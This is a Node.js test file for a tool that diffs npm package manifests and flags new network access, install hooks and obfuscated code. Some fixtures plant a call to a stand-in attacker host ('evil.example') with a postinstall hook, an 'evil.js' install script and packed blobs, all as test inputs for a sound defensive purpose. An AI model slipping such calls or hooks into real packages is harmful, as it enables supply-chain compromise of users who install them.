'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

const { diffManifests, unionOfManifests } = require('../lib/diff');
const { scanPackageDir } = require('../lib/scanner');
const { mkTmpDir, writePackage } = require('./helpers');

function scan(tmp, relDir, pkgJson, files) {
  return scanPackageDir(writePackage(tmp, relDir, pkgJson, files));
}

describe('diffManifests', () => {
  // Regression test for a real CI-gate bypass found while pressure-testing:
  // a version bump that adds ONLY a new risk flag (e.g. a newly-obfuscated
  // blob) without any tracked capability category flipping from absent to
  // present previously left `escalated` false, so `capsurface check`
  // printed a warning but still exited 0, silently passing the CI gate on
  // exactly the "smuggle a packed payload past the regex" scenario this
  // tool exists to catch.
  test('a new risk flag with no category change still counts as escalation', () => {
    const tmp = mkTmpDir('gap');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    // A realistically packed file: several very long lines, which is what
    // minified or obfuscated output looks like. One long line in otherwise
    // ordinary source is a data blob or a big regex, and is deliberately
    // not flagged, see the data-blob test below.
    const packed = Array.from({ length: 4 }, (_, i) => `var _${i}=${JSON.stringify('a'.repeat(700))};`).join('\n') + '\n';
    const after = scan(tmp, 'v2', { name: 'p', version: '1.0.1' }, { 'index.js': packed });

    assert.equal(before.riskFlags.length, 0);
    assert.ok(after.riskFlags.some((f) => f.includes('obfuscated')));

    const report = diffManifests(before, after);
    assert.equal(report.escalated, true, 'obfuscation-only new flag must fail the check');
  });

  test('an actual new capability still escalates (no regression)', () => {
    const tmp = mkTmpDir('escalate');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(
      tmp,
      'v2',
      { name: 'p', version: '1.0.1', scripts: { postinstall: 'node x.js' } },
      { 'index.js': "require('https').get('http://evil.example/x');\n" }
    );
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
    assert.ok(report.changes.some((c) => c.type === 'capability-added' && c.category === 'network'));
  });

  test('an unrelated version with identical capabilities does not escalate', () => {
    const tmp = mkTmpDir('no-escalate');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': "require('fs');\n" });
    const after = scan(tmp, 'v2', { name: 'p', version: '1.0.1' }, { 'index.js': "require('fs');\n" });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
  });
});

describe('unionOfManifests', () => {
  test('a capability approved in ANY prior version is not treated as new', () => {
    const tmp = mkTmpDir('union');
    // Two previously-approved installed versions of the same name: one has
    // filesystem access, the other has network access.
    const v1 = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': "require('fs');\n" });
    const v2 = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, { 'index.js': "require('https');\n" });
    const union = unionOfManifests([v1, v2]);
    assert.equal(union.capabilities.filesystem.present, true);
    assert.equal(union.capabilities.network.present, true);

    // A new install of version 1.5.0 that only uses fs (already approved
    // via v1) should not read as an escalation just because v2 (an
    // unrelated sibling installed elsewhere in the tree) didn't have fs.
    const v15 = scan(tmp, 'v15', { name: 'p', version: '1.5.0' }, { 'index.js': "require('fs');\n" });
    const report = diffManifests(union, v15);
    assert.equal(report.escalated, false);
  });

  test('a genuinely new capability across all approved versions still escalates', () => {
    const tmp = mkTmpDir('union-new');
    const v1 = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': "require('fs');\n" });
    const v2 = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, { 'index.js': "require('fs');\n" });
    const union = unionOfManifests([v1, v2]);
    const v3 = scan(
      tmp,
      'v3',
      { name: 'p', version: '3.0.0', scripts: { postinstall: 'node x.js' } },
      { 'index.js': "require('fs'); require('https');\n" }
    );
    const report = diffManifests(union, v3);
    assert.equal(report.escalated, true);
    assert.ok(report.changes.some((c) => c.category === 'network'));
  });

  test('lifecycle script matching ANY previously-approved value for that key is not flagged', () => {
    const tmp = mkTmpDir('union-scripts');
    const v1 = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { postinstall: 'node build.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const v2 = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { postinstall: 'node build2.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const union = unionOfManifests([v1, v2]);
    // Same script body as v1, different version number.
    const v15 = scan(tmp, 'v15', { name: 'p', version: '1.5.0', scripts: { postinstall: 'node build.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report = diffManifests(union, v15);
    assert.ok(
      !report.changes.some((c) => c.type === 'lifecycle-script-changed'),
      'a script body matching any previously-approved version should not be flagged as changed'
    );

    const v3 = scan(tmp, 'v3', { name: 'p', version: '3.0.0', scripts: { postinstall: 'node evil.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report2 = diffManifests(union, v3);
    assert.ok(report2.changes.some((c) => c.type === 'lifecycle-script-changed'));
    assert.equal(report2.escalated, true);
  });

  test('throws a clear error rather than crashing cryptically on an empty manifest array', () => {
    assert.throws(() => unionOfManifests([]), /at least one manifest/);
  });

  // Regression test for a real shape gap found in review: the union
  // manifest omitted obfuscationSignal entirely and left lifecycleScripts
  // missing its present/installTriggering fields, unlike every real
  // manifest (lib/scanner.js always sets all three). Harmless for
  // diffManifests today (it doesn't read them off the baseline side), but
  // a landmine for any future/other code that inspects a union manifest
  // the same generic way it inspects a real one.
  test('produces a manifest with the same capability shape as a real scanned manifest', () => {
    const tmp = mkTmpDir('union-shape');
    const longLine = 'x'.repeat(800) + ';';
    const v1 = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': longLine });
    const v2 = scan(
      tmp,
      'v2',
      { name: 'p', version: '2.0.0', scripts: { postinstall: 'node x.js' } },
      { 'index.js': 'module.exports = {};\n' }
    );
    assert.equal(v1.capabilities.obfuscationSignal.present, true);
    assert.equal(v2.capabilities.lifecycleScripts.installTriggering, true);

    const union = unionOfManifests([v1, v2]);
    assert.ok(union.capabilities.obfuscationSignal, 'obfuscationSignal must be present in the union shape');
    assert.equal(union.capabilities.obfuscationSignal.present, true);
    assert.equal(union.capabilities.lifecycleScripts.present, true);
    assert.equal(union.capabilities.lifecycleScripts.installTriggering, true);
  });
});
